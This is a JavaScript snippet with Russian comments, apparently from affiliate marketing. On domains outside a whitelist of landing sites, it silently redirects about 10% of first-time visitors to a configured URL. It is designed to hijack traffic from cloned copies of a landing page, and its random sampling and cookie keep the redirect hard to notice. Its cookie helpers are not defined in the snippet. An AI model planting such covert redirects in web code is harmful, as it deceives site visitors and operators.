function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
 
function js_h_check() {
 
    //НАСТРОЙКИ начало
 
    //процент от 1 до 100
    var percent = 10;
 
    //куда редиректить
    var redirect_url = "https://your-domain.com/";
 
    //список доменов на которых расположены ленды, на этих доменах (и поддоменах этих доменах) редирект отрабатывать не будет
    var js_h_domains = [
        'domain-landing1.com',
        'domain-landing2.com',
        'domain-landing3.com',
        'domain-landing4.com',
        'domain-landing5.com',
    ];
 
    //НАСТРОЙКИ конец
 
    var current_domain = window.location.hostname;
 
    var cookie = getCookie("js_h_ajax");
    setCookie("js_h_ajax", "1", 365);
 
 
    var result = false;
    for (var k = 0; k < js_h_domains.length; k++) {
        var d = js_h_domains[k];
        if (current_domain.includes(d)) {
            result = true;
            break;
        }
    }
 
    var rnd = getRandomInt(1, 100) <= percent ? true : false;
 
    if (!result && !cookie && rnd) {
        window.location = redirect_url;
    }
}
 
js_h_check();